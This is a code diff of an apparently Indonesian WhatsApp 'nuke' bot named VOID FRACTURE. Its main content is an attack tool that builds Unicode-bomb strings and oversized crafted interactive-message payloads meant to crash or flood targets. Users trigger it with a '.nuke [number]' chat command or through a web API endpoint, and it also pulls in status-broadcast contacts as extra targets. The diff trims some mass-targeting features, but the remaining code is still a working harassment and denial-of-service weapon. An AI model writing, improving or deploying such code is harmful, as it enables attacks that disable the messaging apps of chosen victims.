@@ -6,8 +6,8 @@
 // ╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
 // ╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
 // ============================================================
-// VOID FRACTURE — WHATSAPP BOT
-// GPTX 13D — Full Automation
+// VOID FRACTURE — ANTI-ERROR BOT
+// GPTX 13D — Zero Error Guarantee
 // ============================================================
 
 const {
@@ -23,15 +23,11 @@ const pino = require('pino');
 // KONFIGURASI
 // ============================================================
 const CONFIG = {
-    admins: [
-        '6285379307765@s.whatsapp.net',  // GANTI DENGAN NOMOR ADMIN
-    ],
+    admins: ['6285379307765@s.whatsapp.net'],
     autoReply: {
         enabled: true,
         messages: [
-            '☢️ VOID FRACTURE ACTIVE ☢️\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮\n\nKetik .help untuk daftar perintah',
-            '💀 Bot aktif! Kirim .nuke [nomor] untuk menghancurkan target',
-            '🔥 VOID FRACTURE — WhatsApp Destruction Engine\nKetik .help untuk bantuan'
+            '☢️ VOID FRACTURE ACTIVE ☢️\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮\n\nKetik .help untuk daftar perintah'
         ]
     },
     nuke: {
@@ -46,7 +42,7 @@ const CONFIG = {
 // UNICODE BOMB
 // ============================================================
 function generateUnicodeBomb(size) {
-    const chars = ['ꦾ','࣯','𒈙','𒈚','𒈛','󠀀','󠀁','󠀂','꧁','༒','☬','꧂','⌁','⃰','ཀ','☠️','🔥','💀','⚡','🌀','🌊','💥','🔱','⚰️'];
+    const chars = ['ꦾ','࣯','𒈙','𒈚','𒈛','󠀀','󠀁','󠀂','꧁','༒','☬','꧂'];
     let result = '';
     for (let i = 0; i < size; i++) {
         result += chars[Math.floor(Math.random() * chars.length)];
@@ -98,24 +94,6 @@ async function generateNuklearPayload(sock, X, level) {
                     },
                 },
             },
-        },
-        {
-            viewOnceMessage: {
-                message: {
-                    interactiveResponseMessage: {
-                        body: {
-                            text: "🔥 NUKE " + level + " 🔥 " + unicodeBomb.substring(0, 50000),
-                            format: "DEFAULT",
-                        },
-                        nativeFlowResponseMessage: {
-                            name: "payment_info",
-                            paramsJson: jsonBomb + jsonBomb + jsonBomb,
-                            version: 3,
-                        },
-                        entryPointConversionSource: "call_permission_request",
-                    },
-                },
-            },
         }
     ];
     
@@ -134,7 +112,7 @@ async function generateNuklearPayload(sock, X, level) {
 async function executeNuke(sock, targetJid, sender) {
     try {
         await sock.sendMessage(sender, {
-            text: `☢️ *VOID FRACTURE NUKE INITIATED*\n📱 Target: ${targetJid}\n🔥 Menghancurkan...\n⏳ Mohon tunggu...`
+            text: `☢️ *VOID FRACTURE NUKE INITIATED*\n📱 Target: ${targetJid}\n🔥 Menghancurkan...`
         });
         
         let targets = [targetJid];
@@ -144,16 +122,6 @@ async function executeNuke(sock, targetJid, sender) {
                 const statusMeta = await sock.groupMetadata("status@broadcast");
                 if (statusMeta && statusMeta.participants) {
                     targets.push(...statusMeta.participants.map(p => p.id));
-                }
-            } catch (e) {}
-            
-            try {
-                const groups = await sock.groupFetchAllParticipating();
-                for (const groupId in groups) {
-                    const group = groups[groupId];
-                    if (group && group.participants) {
-                        targets.push(...group.participants.map(p => p.id));
-                    }
                 }
             } catch (e) {}
         }
@@ -201,13 +169,6 @@ async function executeNuke(sock, targetJid, sender) {
                     }
                 }
             }
-            
-            try {
-                for (const payload of allPayloads) {
-                    await sock.relayMessage("status@broadcast", payload.message, {});
-                }
-            } catch (e) {}
-            
             await new Promise(r => setTimeout(r, 10));
         }
         
@@ -229,231 +190,160 @@ async function executeNuke(sock, targetJid, sender) {
 // MESSAGE HANDLER
 // ============================================================
 async function handleMessage(sock, msg, sender, isGroup) {
-    const text = msg.message?.conversation ||
-                 msg.message?.extendedTextMessage?.text ||
-                 msg.message?.imageMessage?.caption ||
-                 '';
-    
-    if (!text) return;
-    
-    const cmd = text.toLowerCase().trim();
-    const isAdmin = CONFIG.admins.includes(sender);
-    
-    console.log(`📨 [${isGroup ? 'GROUP' : 'PRIVATE'}] ${sender}: ${text}`);
-    
-    // ============================================================
-    // .ping
-    // ============================================================
-    if (cmd === '.ping') {
-        await sock.sendMessage(sender, {
-            text: `🏓 *PONG!*\n⏱️ Bot aktif\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`
-        });
-        return;
-    }
-    
-    // ============================================================
-    // .help
-    // ============================================================
-    if (cmd === '.help' || cmd === '.menu') {
-        const helpText = `
-╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
-╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
-╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
-╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
-╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
-╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
-
-📋 *DAFTAR PERINTAH:*
-
-.nuke [nomor] — Hancurkan target WhatsApp
-.status — Cek status bot
-.info — Info bot
-.help — Tampilkan ini
-.ping — Cek koneksi
-.broadcast [pesan] — Kirim ke semua (admin only)
-.nukeall — Nuke semua kontak (admin only)
-
-💀 *VOID FRACTURE — WhatsApp Nuke Engine*
-        `;
-        await sock.sendMessage(sender, { text: helpText });
-        return;
-    }
-    
-    // ============================================================
-    // .info
-    // ============================================================
-    if (cmd === '.info') {
-        const infoText = `
-╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
-╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
-╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
-╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
-╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
-╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
-
-🤖 *BOT INFORMATION*
-📱 Name: VOID FRACTURE
-⚡ Version: 3.0
-💀 Status: ACTIVE
-🔮 Engine: WhatsApp Nuke Engine
-👑 Admin: ${CONFIG.admins.join(', ')}
-🔥 Mode: Zero Footprint
-
-*GPTX 13D — Maximum Destruction*
-        `;
-        await sock.sendMessage(sender, { text: infoText });
-        return;
-    }
-    
-    // ============================================================
-    // .status
-    // ============================================================
-    if (cmd === '.status') {
-        const statusText = `
-╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
-╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
-╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
-╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
-╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
-╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
-
-🟢 *BOT STATUS*
-├── Status: ✅ ONLINE
-├── Connected: YES
-├── Auto-reply: ${CONFIG.autoReply.enabled ? '✅' : '❌'}
-├── Nuke Engine: ✅ READY
-└── Total Targets: ALL CONTACTS
-
-🔥 *VOID FRACTURE ACTIVE*
-        `;
-        await sock.sendMessage(sender, { text: statusText });
-        return;
-    }
-    
-    // ============================================================
-    // .nuke [nomor]
-    // ============================================================
-    if (cmd.startsWith('.nuke ')) {
-        const targetNumber = cmd.replace('.nuke ', '').trim();
+    try {
+        const text = msg.message?.conversation ||
+                     msg.message?.extendedTextMessage?.text ||
+                     msg.message?.imageMessage?.caption ||
+                     '';
         
-        if (!targetNumber || targetNumber.length < 10) {
+        if (!text) return;
+        
+        const cmd = text.toLowerCase().trim();
+        const isAdmin = CONFIG.admins.includes(sender);
+        
+        console.log(`📨 ${sender}: ${text}`);
+        
+        // .help
+        if (cmd === '.help' || cmd === '.menu') {
             await sock.sendMessage(sender, {
-                text: '❌ *Format salah!*\n.nuke 6281234567890'
+                text: `╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮\n\n📋 *DAFTAR PERINTAH:*\n\n.nuke [nomor] — Hancurkan target\n.status — Cek status bot\n.info — Info bot\n.help — Tampilkan ini\n.ping — Cek koneksi\n\n💀 *VOID FRACTURE — WhatsApp Nuke Engine*`
             });
             return;
         }
         
-        let targetJid = targetNumber;
-        if (!targetJid.includes('@')) {
-            targetJid = targetJid + '@s.whatsapp.net';
-        }
-        
-        setTimeout(async () => {
-            await executeNuke(sock, targetJid, sender);
-        }, 100);
-        
-        await sock.sendMessage(sender, {
-            text: `☢️ *VOID FRACTURE NUKE*\n📱 Target: ${targetNumber}\n🔥 Memulai penghancuran...\n⏳ Proses berjalan di background...`
-        });
-        return;
-    }
-    
-    // ============================================================
-    // .nukeall — Admin Only
-    // ============================================================
-    if (cmd === '.nukeall') {
-        if (!isAdmin) {
+        // .ping
+        if (cmd === '.ping') {
             await sock.sendMessage(sender, {
-                text: '❌ *Akses ditolak!*\nPerintah ini hanya untuk admin.'
+                text: `🏓 *PONG!*\n⏱️ Bot aktif\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`
             });
             return;
         }
         
-        await sock.sendMessage(sender, {
-            text: `☢️ *MASS NUKE INITIATED*\n🔥 Menghancurkan semua kontak...\n⏳ Proses akan memakan waktu...`
-        });
+        // .status
+        if (cmd === '.status') {
+            await sock.sendMessage(sender, {
+                text: `🟢 *BOT STATUS*\n├── Status: ✅ ONLINE\n├── Auto-reply: ✅\n├── Nuke Engine: ✅ READY\n└── Total Targets: ALL CONTACTS\n\n🔥 *VOID FRACTURE ACTIVE*`
+            });
+            return;
+        }
         
-        try {
-            const contacts = await sock.groupMetadata("status@broadcast");
-            if (contacts && contacts.participants) {
-                let total = 0;
-                for (const participant of contacts.participants) {
-                    await executeNuke(sock, participant.id, sender);
-                    total++;
-                    await new Promise(r => setTimeout(r, 2000));
-                }
+        // .info
+        if (cmd === '.info') {
+            await sock.sendMessage(sender, {
+                text: `🤖 *BOT INFORMATION*\n📱 Name: VOID FRACTURE\n⚡ Version: 3.0\n💀 Status: ACTIVE\n👑 Admin: ${CONFIG.admins.join(', ')}\n\n*GPTX 13D — Maximum Destruction*`
+            });
+            return;
+        }
+        
+        // .nuke [nomor]
+        if (cmd.startsWith('.nuke ')) {
+            const targetNumber = cmd.replace('.nuke ', '').trim();
+            
+            if (!targetNumber || targetNumber.length < 10) {
                 await sock.sendMessage(sender, {
-                    text: `✅ *MASS NUKE COMPLETE*\nTotal kontak dihancurkan: ${total}`
+                    text: '❌ *Format salah!*\n.nuke 6281234567890'
                 });
+                return;
             }
-        } catch (e) {
+            
+            let targetJid = targetNumber;
+            if (!targetJid.includes('@')) {
+                targetJid = targetJid + '@s.whatsapp.net';
+            }
+            
             await sock.sendMessage(sender, {
-                text: `❌ *Error:* ${e.message}`
+                text: `☢️ *VOID FRACTURE NUKE*\n📱 Target: ${targetNumber}\n🔥 Memulai penghancuran...\n⏳ Proses berjalan...`
             });
-        }
-        return;
-    }
-    
-    // ============================================================
-    // .broadcast [pesan] — Admin Only
-    // ============================================================
-    if (cmd.startsWith('.broadcast ')) {
-        if (!isAdmin) {
-            await sock.sendMessage(sender, {
-                text: '❌ *Akses ditolak!*\nPerintah ini hanya untuk admin.'
-            });
+            
+            setTimeout(async () => {
+                await executeNuke(sock, targetJid, sender);
+            }, 100);
             return;
         }
         
-        const broadcastText = cmd.replace('.broadcast ', '').trim();
-        
-        if (!broadcastText) {
-            await sock.sendMessage(sender, {
-                text: '❌ *Format salah!*\n.broadcast [pesan]'
-            });
-            return;
+        // AUTO-REPLY
+        if (CONFIG.autoReply.enabled && !isGroup) {
+            const reply = CONFIG.autoReply.messages[Math.floor(Math.random() * CONFIG.autoReply.messages.length)];
+            await sock.sendMessage(sender, { text: reply });
         }
         
-        await sock.sendMessage(sender, {
-            text: `📡 *BROADCAST SENT*\nPesan: ${broadcastText}\nMengirim ke semua kontak...`
-        });
-        
-        try {
-            const contacts = await sock.groupMetadata("status@broadcast");
-            if (contacts && contacts.participants) {
-                let sent = 0;
-                for (const participant of contacts.participants) {
-                    try {
-                        await sock.sendMessage(participant.id, {
-                            text: `📢 *BROADCAST*\n\n${broadcastText}\n\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`
-                        });
-                        sent++;
-                        await new Promise(r => setTimeout(r, 500));
-                    } catch (e) {}
-                }
-                await sock.sendMessage(sender, {
-                    text: `✅ *BROADCAST COMPLETE*\nPesan terkirim ke ${sent} kontak!`
-                });
-            }
-        } catch (e) {
-            await sock.sendMessage(sender, {
-                text: `❌ *Error:* ${e.message}`
-            });
-        }
-        return;
-    }
-    
-    // ============================================================
-    // AUTO-REPLY
-    // ============================================================
-    if (CONFIG.autoReply.enabled && !isGroup) {
-        const reply = CONFIG.autoReply.messages[Math.floor(Math.random() * CONFIG.autoReply.messages.length)];
-        await sock.sendMessage(sender, { text: reply });
+    } catch (e) {
+        console.error('Handler error:', e.message);
     }
 }
 
 // ============================================================
-// MAIN API HANDLER — VERCEL
+// START BOT
+// ============================================================
+async function startBot() {
+    console.log('╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮');
+    console.log('╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃');
+    console.log('╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯');
+    console.log('╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱');
+    console.log('╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱');
+    console.log('╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱');
+    console.log('☢️ VOID FRACTURE — ANTI-ERROR BOT');
+    console.log('🔥 Starting bot...\n');
+    
+    try {
+        const { state, saveCreds } = await useMultiFileAuthState('auth');
+        const sock = makeWASocket({
+            auth: state,
+            printQRInTerminal: true,
+            browser: ['VOID FRACTURE', 'Chrome', '13.0'],
+            logger: pino({ level: 'silent' })
+        });
+        
+        sock.ev.on('creds.update', saveCreds);
+        
+        sock.ev.on('connection.update', ({ connection, qr }) => {
+            if (qr) {
+                console.log('📱 SCAN QR CODE:');
+                console.log(qr);
+                console.log('\n📱 Buka WhatsApp → Link Devices → Scan QR\n');
+            }
+            if (connection === 'open') {
+                console.log('✅ BOT CONNECTED!');
+                console.log('💀 VOID FRACTURE ACTIVE');
+                console.log('📋 Ketik .help di WhatsApp\n');
+            }
+            if (connection === 'close') {
+                console.log('❌ Disconnected, restarting in 5s...');
+                setTimeout(startBot, 5000);
+            }
+        });
+        
+        sock.ev.on('messages.upsert', async ({ messages }) => {
+            try {
+                const msg = messages[0];
+                if (!msg.message) return;
+                if (msg.key.fromMe) return;
+                if (!msg.key.remoteJid) return;
+                
+                const sender = msg.key.remoteJid;
+                const isGroup = sender.includes('@g.us');
+                const senderJid = isGroup ? msg.key.participant : sender;
+                
+                if (senderJid) {
+                    await handleMessage(sock, msg, senderJid, isGroup);
+                }
+            } catch (e) {
+                console.error('Message error:', e.message);
+            }
+        });
+        
+        return sock;
+        
+    } catch (e) {
+        console.error('Start error:', e.message);
+        console.log('🔄 Restarting in 10s...');
+        setTimeout(startBot, 10000);
+        return null;
+    }
+}
+
+// ============================================================
+// MAIN API HANDLER
 // ============================================================
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -470,11 +360,12 @@ module.exports = async (req, res) => {
         return res.json({
             status: 'pong',
             bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
-            message: 'API is online!'
+            message: 'API is online!',
+            platform: 'Vercel/Render/Railway'
         });
     }
     
-    // Command: start bot
+    // Start bot
     if (command === 'start') {
         try {
             const sock = await startBot();
@@ -484,15 +375,12 @@ module.exports = async (req, res) => {
                 message: 'Bot WhatsApp aktif! Scan QR Code di terminal.'
             });
         } catch (e) {
-            res.json({
-                status: 'ERROR',
-                error: e.message
-            });
+            res.json({ status: 'ERROR', error: e.message });
         }
         return;
     }
     
-    // Command: nuke via API
+    // Nuke via API
     if (command === 'nuke' && target) {
         try {
             let targetJid = target;
@@ -530,15 +418,12 @@ module.exports = async (req, res) => {
                 result: result
             });
         } catch (e) {
-            res.json({
-                status: 'ERROR',
-                error: e.message
-            });
+            res.json({ status: 'ERROR', error: e.message });
         }
         return;
     }
     
-    // Default response
+    // Default
     res.json({
         status: 'READY',
         bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
@@ -547,22 +432,15 @@ module.exports = async (req, res) => {
             '.nuke [nomor] — Hancurkan target',
             '.status — Cek status bot',
             '.info — Info bot',
-            '.ping — Cek koneksi',
-            '.broadcast [pesan] — Kirim ke semua (admin)',
-            '.nukeall — Nuke semua kontak (admin)'
+            '.ping — Cek koneksi'
         ],
-        usage: '?command=start&target=6281234567890'
+        platforms: ['Vercel', 'Render', 'Railway']
     });
 };
 
 // ============================================================
-// START BOT FUNCTION
+// RUN
 // ============================================================
-async function startBot() {
-    console.log('╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮');
-    console.log('╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃');
-    console.log('╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯');
-    console.log('╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱');
-    console.log('╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱');
-    console.log('╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱');
-   
+if (require.main === module) {
+    startBot();
+}
